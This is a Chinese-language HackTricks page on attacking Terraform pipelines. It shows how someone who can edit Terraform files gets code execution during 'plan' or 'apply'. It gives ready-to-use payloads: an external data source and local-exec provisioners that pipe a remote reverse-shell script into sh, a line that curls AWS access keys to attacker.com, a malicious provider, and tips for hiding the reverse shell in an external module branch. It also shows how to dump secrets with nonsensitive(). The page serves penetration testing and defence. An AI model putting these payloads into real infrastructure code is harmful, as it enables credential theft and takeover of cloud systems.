# Terraform安全

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF格式的HackTricks，请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## 基本信息

HashiCorp Terraform是一种**基础设施即代码工具**，它允许您使用人类可读的配置文件定义**云端和本地资源**，并对其进行版本控制、重用和共享。然后，您可以使用一致的工作流程来规划和管理整个基础设施的生命周期。Terraform可以管理低级组件，如计算、存储和网络资源，以及高级组件，如DNS条目和SaaS功能。

### Terraform如何工作？

Terraform通过应用程序编程接口（API）在云平台和其他服务上创建和管理资源。提供者使Terraform能够与几乎任何具有可访问API的平台或服务一起工作。

![](<../../.gitbook/assets/image (33).png>)

HashiCorp和Terraform社区已经编写了**超过1700个提供者**，用于管理数千种不同类型的资源和服务，这个数字还在不断增长。您可以在[Terraform Registry](https://registry.terraform.io/)上找到所有公开可用的提供者，包括Amazon Web Services (AWS)、Azure、Google Cloud Platform (GCP)、Kubernetes、Helm、GitHub、Splunk、DataDog等等。

核心的Terraform工作流程包括三个阶段：

* **编写：**您定义资源，这些资源可能跨越多个云提供商和服务。例如，您可以创建一个配置，将应用程序部署到具有安全组和负载均衡器的虚拟机中的虚拟私有云（VPC）网络上。
* **规划：**Terraform创建一个执行计划，描述基于现有基础设施和您的配置将要创建、更新或销毁的基础设施。
* **应用：**经过批准，Terraform按照正确的顺序执行所提议的操作，遵守任何资源依赖关系。例如，如果您更新了VPC的属性并更改了该VPC中的虚拟机数量，Terraform将在扩展虚拟机之前重新创建VPC。

![](<../../.gitbook/assets/image (81).png>)

### Terraform Enterprise

Terraform Enterprise允许您在**Terraform Cloud的自托管版本**中远程运行`terraform plan`或`terraform apply`等命令。因此，如果您找到了访问该Terraform服务器的**API密钥**，您就可以**危害它**。
有关更多信息，请参阅：

{% content-ref url="terraform-enterprise-security.md" %}
[terraform-enterprise-security.md](terraform-enterprise-security.md)
{% endcontent-ref %}

## Terraform实验

只需在计算机上安装terraform。

这里有一个[指南](https://learn.hashicorp.com/tutorials/terraform/install-cli)，这里有一个[下载terraform的最佳方式](https://www.terraform.io/downloads)。

## Terraform中的RCE

Terraform**没有公开的网页或网络服务**可以枚举，因此，入侵terraform的唯一方法是**能够添加/修改terraform配置文件**。

然而，terraform是一个**非常敏感的组件**，因为它将对不同位置具有**特权访问**，以便能够正常工作。

攻击者能够入侵运行terraform的系统的主要方法是**入侵存储terraform配置的存储库**，因为在某个时刻它们将被**解释**。

实际上，已经有一些解决方案可以在创建PR后**自动执行terraform plan/apply**，例如**Atlantis**：

{% content-ref url="../atlantis-security.md" %}
[atlantis-security.md](../atlantis-security.md)
{% endcontent-ref %}

如果您能够入侵terraform文件，那么在执行`terraform plan`或`terraform apply`时，您可以使用不同的方法执行RCE。

### Terraform plan

Terraform plan是terraform中**最常用的命令**，开发人员/使用terraform的解决方案经常调用它，因此获得RCE的**最简单方法**是确保您在一个terraform配置文件中注入将在`terraform plan`执行时执行任意命令的代码。

#### 使用外部提供者

Terraform提供了[`external`提供者](https://registry.terraform.io/providers/hashicorp/external/latest/docs)，它提供了在Terraform和外部程序之间进行接口的方法。您可以使用`external`数据源在`plan`期间运行任意代码。

在terraform配置文件中注入以下内容将在执行`terraform plan`时执行一个反向shell：
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### 使用自定义提供程序

任何人都可以编写一个[自定义提供程序](https://learn.hashicorp.com/tutorials/terraform/provider-setup)并将其发布到[Terraform Registry](https://registry.terraform.io/)。您还可以尝试从私有注册表中拉取自定义提供程序。

步骤如下：

* 编写一个自定义提供程序，运行一些恶意代码（例如窃取凭据或客户数据）
* 将其发布到Terraform Registry
* 在功能分支中的Terraform代码中添加提供程序
* 为功能分支打开一个PR
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
由于提供程序将在`init`期间被拉取并在`plan`期间运行一些代码，因此您可以执行任意代码。

您可以在[https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)中找到一个示例。

#### 使用外部引用

上述两种选项都很有用，但不够隐蔽（第二种比第一种更隐蔽，但比第一种更复杂）。您可以以更隐蔽的方式执行此攻击，按照以下建议操作：

* 不要直接将反向shell添加到terraform文件中，而是可以**加载包含反向shell的外部资源**：
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
您可以在[https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)找到反向shell代码。

* 在外部资源中，使用**ref**功能将**terraform反向shell代码隐藏在存储库的一个分支中**，类似于：`git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

将执行Terraform apply以应用所有更改，您还可以滥用它来注入**带有[local-exec](https://www.terraform.io/docs/provisioners/local-exec.html)的恶意Terraform文件**以获得RCE。\
您只需要确保以下类似的有效负载出现在`main.tf`文件中：
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
遵循前一种技术的建议，使用外部引用以更隐蔽的方式执行此攻击。

## 密钥泄露

您可以通过在terraform文件中添加以下内容来运行`terraform apply`来获取terraform使用的**秘密值的转储**：
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## 审计工具

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec使用静态分析你的terraform代码来发现潜在的配置错误。
* [**terascan**](https://github.com/tenable/terrascan): Terrascan是一种用于基础设施即代码的静态代码分析器。

## 参考资料

* [Atlantis安全](../atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果你想看到你的**公司在HackTricks中被广告**，或者如果你想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享你的黑客技巧。**

</details>
